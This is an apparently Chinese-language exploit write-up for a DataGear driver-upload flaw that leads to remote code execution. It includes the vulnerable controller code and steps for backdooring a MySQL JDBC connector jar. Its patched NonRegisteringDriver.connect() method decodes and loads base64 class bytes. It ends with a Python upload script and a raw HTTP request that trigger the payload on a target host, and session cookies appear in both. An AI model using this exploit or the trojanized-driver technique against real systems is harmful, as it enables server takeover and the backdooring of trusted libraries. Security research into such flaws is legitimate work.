# 数据库驱动上传RCE

**漏洞代码**

`org.datagear.web.controller.DriverEntityController`

该系统存在添加数据源功能，但数据库驱动是单独加载的，不在classpath中。

漏洞关键在于`driverEntityManager.get(id)`方法，该方法会验证用户传入的id是否和本地已存在的数据库驱动id相同，如果相同，则会把用户上传的文件放在同一id数据库驱动文件夹下，此时如果文件名和原驱动相同，则会导致驱动文件被恶意文件覆盖。同理，也可以上传H2驱动来RCE

```java
@RequestMapping(value = "/uploadDriverFile", produces = CONTENT_TYPE_JSON)
@ResponseBody
public Map<String, Object> uploadDriverFile(HttpServletRequest request, @RequestParam("id") String id,
        @RequestParam("file") MultipartFile multipartFile) throws Exception
{
    FileInfo[] fileInfos;
    List<String> driverClassNames = new ArrayList<>();

    String originalFilename = multipartFile.getOriginalFilename();

    DriverEntity driverEntity = this.driverEntityManager.get(id);

    if (driverEntity != null)
    {
        InputStream in = multipartFile.getInputStream();

        try
        {
            this.driverEntityManager.addDriverLibrary(driverEntity, originalFilename, in);
        }
        finally
        {
            IOUtil.close(in);
        }

        List<DriverLibraryInfo> driverLibraryInfos = this.driverEntityManager.getDriverLibraryInfos(driverEntity);
        fileInfos = toFileInfos(driverLibraryInfos);
    }
```

**恶意jar包制作步骤**

这里以mysql为例

1. 备份正常的`mysql-connector-java-8.0.23.jar`包，解压

2. 反编译`com\mysql\cj\jdbc\NonRegisteringDriver.class`

3. com\mysql\cj\jdbc\目录下创建`NonRegisteringDriver.java`

4. 编译`NonRegisteringDriver.java`

   ```
   javac -cp "." com\mysql\cj\jdbc\NonRegisteringDriver.java
   ```

5. 将编译好的class压入jar包

   ```
   jar -uvf mysql-connector-java-8.0.23.jar com\mysql\cj\jdbc\NonRegisteringDriver.class
   ```

`NonRegisteringDriver.java`代码如下，修改了`connect`方法，加载字节码，数据库连接`getConnection`必然会调用这个方法。

```java
package com.mysql.cj.jdbc;

import com.mysql.cj.Constants;
import com.mysql.cj.Messages;
import com.mysql.cj.conf.ConnectionUrl;
import com.mysql.cj.conf.HostInfo;
import com.mysql.cj.conf.PropertyKey;
import com.mysql.cj.exceptions.CJException;
import com.mysql.cj.exceptions.ExceptionFactory;
import com.mysql.cj.exceptions.UnableToConnectException;
import com.mysql.cj.exceptions.UnsupportedConnectionStringException;
import com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping;
import com.mysql.cj.jdbc.ha.FailoverConnectionProxy;
import com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy;
import com.mysql.cj.jdbc.ha.ReplicationConnectionProxy;
import com.mysql.cj.util.StringUtils;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverPropertyInfo;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.List;
import java.util.Properties;
import java.util.logging.Logger;
import java.lang.reflect.Method;

public class NonRegisteringDriver implements Driver {
  public static String getOSName() {
    return Constants.OS_NAME;
  }
  
  public static String getPlatform() {
    return Constants.OS_ARCH;
  }
  
  static {
    try {
      Class.forName(AbandonedConnectionCleanupThread.class.getName());
    } catch (ClassNotFoundException classNotFoundException) {}
  }
  
  static int getMajorVersionInternal() {
    return StringUtils.safeIntParse("8");
  }
  
  static int getMinorVersionInternal() {
    return StringUtils.safeIntParse("0");
  }
  
  public boolean acceptsURL(String url) throws SQLException {
    try {
      return ConnectionUrl.acceptsUrl(url);
    } catch (CJException cJException) {
      throw SQLExceptionsMapping.translateException(cJException);
    } 
  }

  public static Class defineCls(String message) {
        try {
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);
            byte[] clazzByte = base64Decode(message);

            return (Class) defineClass.invoke(
                    Thread.currentThread().getContextClassLoader(), 
                    clazzByte, 0, clazzByte.length
            );
        } catch (Throwable var5) {
            var5.printStackTrace();
        }
        return null;
    }

    public static byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var4) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
  
  public Connection connect(String url, Properties info) throws SQLException {
    try {
      try {
        String javaCode = "yv66xxxxxx";
        Class clazz = defineCls(javaCode);
        if (clazz != null) {
            clazz.newInstance();
        }
        if (!ConnectionUrl.acceptsUrl(url))
          return null; 
        ConnectionUrl conStr = ConnectionUrl.getConnectionUrlInstance(url, info);
        switch (conStr.getType()) {
          case SINGLE_CONNECTION:
            return ConnectionImpl.getInstance(conStr.getMainHost());
          case FAILOVER_CONNECTION:
          case FAILOVER_DNS_SRV_CONNECTION:
            return FailoverConnectionProxy.createProxyInstance(conStr);
          case LOADBALANCE_CONNECTION:
          case LOADBALANCE_DNS_SRV_CONNECTION:
            return (Connection)LoadBalancedConnectionProxy.createProxyInstance(conStr);
          case REPLICATION_CONNECTION:
          case REPLICATION_DNS_SRV_CONNECTION:
            return (Connection)ReplicationConnectionProxy.createProxyInstance(conStr);
        } 
        return null;
      } catch (UnsupportedConnectionStringException e) {
        return null;
      } catch (CJException ex) {
        throw (UnableToConnectException)ExceptionFactory.createException(UnableToConnectException.class, 
            Messages.getString("NonRegisteringDriver.17", new Object[] { ex.toString() }), ex);
      } 
    } catch (CJException cJException) {
      throw SQLExceptionsMapping.translateException(cJException);
    } catch (Exception e) {}
    return null;
  }
  
  public int getMajorVersion() {
    return getMajorVersionInternal();
  }
  
..............
```

python上传

```python
import requests

url = "http://192.168.239.1:50401/driverEntity/uploadDriverFile"

headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
        "Cookie": "Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1770000191,1770084448,1770775295,1770789903; DG_USER_ID_ANONYMOUS=3bb506ec9c1847088bc69c9f3d672bc5; DG_DETECTED_VERSION=5.5.0; DG_REMEMBER_ME=YWRtaW46MTgwMzYzMDcxOTQ5NTo0MzJmM2Q2ZjY1YWFiZDlkNmViMTU2OTM5MWNkYzQyZg; JSESSIONID=20BCFFEE1023E7E48AD8645265BBD255",
        "Connection": "keep-alive"
    }

data = {
        "id": "jdbcmysql8d0jre8"
    }

proxy = {'http': 'http://127.0.0.1:8080'}

target_path = "mysql-connector-java-8.0.23.jar"

with open(r"C:\Users\13903\Desktop\mysql-connector-java-8.0.23\mysql-connector-java-8.0.23.jar", "rb") as f:
    files = {
        'file': (target_path, f, 'application/octet-stream')
    }
    response = requests.post(url, files=files, headers=headers, data=data, proxies=proxy)

print(response.text)
```

上传后调用`/dtbsSource/testConnection`接口即可

```http
POST /dtbsSource/testConnection HTTP/1.1
Host: 192.168.239.1:50401
Content-Length: 441
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/json
Origin: http://192.168.239.1:50401
Referer: http://192.168.239.1:50401/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1770000191,1770084448,1770775295,1770789903; DG_USER_ID_ANONYMOUS=3bb506ec9c1847088bc69c9f3d672bc5; DG_DETECTED_VERSION=5.5.0; DG_REMEMBER_ME=YWRtaW46MTgwMzYzMDcxOTQ5NTo0MzJmM2Q2ZjY1YWFiZDlkNmViMTU2OTM5MWNkYzQyZg; JSESSIONID=0C174B2F416CEF251D1D6263BED4B1DE
Connection: keep-alive

{"dataPermission":-9,"properties":[],"driverEntity":{"id":"jdbcmysql8d0jre8","driverClassName":"com.mysql.cj.jdbc.Driver","displayName":"mysql-connector-java-8.0.23","jreVersion":"8","databaseName":"MySQL","databaseVersions":["8.0","5.7","5.6"],"displayDescMore":"DB: MySQL, Versions: [8.0, 5.7, 5.6], JRE: 8","displayText":"mysql-connector-java-8.0.23"},"url":"jdbc:mysql://127.0.0.1:3306/aa","title":"test","user":"test","password":"test"}
```

